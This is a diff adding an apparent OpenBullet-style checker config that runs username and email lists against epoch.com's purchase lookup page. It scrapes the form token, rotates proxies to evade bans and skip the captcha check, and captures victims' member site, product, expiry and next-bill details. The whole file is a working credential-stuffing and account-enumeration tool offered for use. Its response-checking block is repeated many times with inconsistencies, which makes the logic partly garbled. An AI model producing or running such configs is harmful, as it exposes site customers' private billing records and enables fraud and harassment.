@@ -1,0 +1,148 @@
+[SETTINGS]
+{
+  "Name": "Epoch",
+  "SuggestedBots": 30,
+  "LastModified": "2018-05-05T17:34:06.4086321+00:00",
+  "AdditionalInfo": "Porn billing portal. Works, with capture. It will ban proxies every 2 attempts so use a lot of proxies and short lists.",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 2,
+  "AllowedWordlist1": "UserMail",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://epoch.com/en/purchase_lookup?view=index" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "head > meta:nth-child(6)" "content" 0 -> VAR "TOKEN" "" "" 
+REQUEST POST "https://epoch.com/en/purchase_lookup?view=index" AutoRedirect=TRUE 
+  CONTENT "authenticity_token=<TOKEN>&card_number=&email=<PASS>&username=<USER>&member_id=&search_form=yes&utf8=✓&g-recaptcha-response=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "=\\"id\\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+    KEY ">USER DETAILS<" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Failure AND 
+    KEY "<SOURCE>" DoesNotContain "FinderCallback#26render=explicit" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Failure AND 
+    KEY "<SOURCE>" DoesNotContain "FinderCallback#26render=explicit" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+  KEYCHAIN Failure AND 
+    KEY "<SOURCE>" DoesNotContain "FinderCallback#26render=explicit" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+    KEY "Please fill out 2 fields" 
+  KEYCHAIN Success OR 
+    KEY "=\"id\">MEMBER ID:" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to locate any orders" 
+  KEYCHAIN Ban OR 
+    KEY "FinderCallback#26render=explicit" 
+    KEY "Please fill out 2 fields" 
+PARSE "<SOURCE>" LR "                     <li>" "<" Recursive=TRUE -> CAP "Site" "" "" 
+PARSE "<SOURCE>" LR "product_info&quot;:&quot;" "&" Recursive=TRUE -> CAP "Info" "" "" 
+PARSE "<SOURCE>" LR "<div>EXPIRES ON: " "<" Recursive=TRUE -> CAP "Expires" "" "" 
+PARSE "<SOURCE>" LR "ate&quot;:&quot;" "&" Recursive=TRUE -> CAP "Next Bill" "" "" 
